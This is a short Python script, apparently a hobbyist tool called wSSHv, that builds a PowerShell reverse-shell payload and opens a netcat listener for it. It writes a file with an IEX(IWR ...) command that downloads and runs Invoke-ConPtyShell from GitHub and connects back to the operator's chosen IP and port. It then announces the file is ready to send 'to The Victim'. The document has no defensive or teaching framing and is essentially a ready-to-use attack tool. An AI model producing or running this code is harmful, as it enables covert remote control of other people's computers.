#!usr/bin/env python

import subprocess

# Created by Emad, my YouTube-Channel: Networkchunk.
# Version 1.0.1. 

# Welcome message!
print("""
                  < This tool been designd for YOU >
                              ___ ___ _  _     
                     __ __ __/ __/ __| || |_ __
                     \ V  V /\__ \__ \ __ \ V /
                      \_/\_/ |___/___/_||_|\_/ 1.0.1
        
       < Enter the Following Steps! To Create PowerShell File >
    """)

# Input ip and port!
ip_to_connect = input("Enter your IP --> ")
port_to_open = input("Enter any PORT --> ")

# Creating PowerShell file with following user Input!
subprocess.getoutput("echo 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPty"
                      "Shell.ps1 -UseBasicParsing); Invoke-ConPtyShell " + ip_to_connect + " " + port_to_open + "' >> wSSHv.ps1")

# A message that (wSSHv.ps1) file been created!
print("\n[*] A File Has Been Created and Ready to Send it to The Victim!\n[*] Press Enter to start the listening..")

# Changing the style to be suitable as WinOS CMD before calling the listening session!
command = 'stty raw -echo; (stty size; cat) | nc -lvnp'
ret = subprocess.run(command, capture_output=True, shell=True)
print(ret.stdout.decode())

# Calling netcat to start the listening session!
subprocess.call(["nc", "-lvnp", port_to_open, "-s", ip_to_connect])

# User could modifie this tool to be more usefull for his porpose !
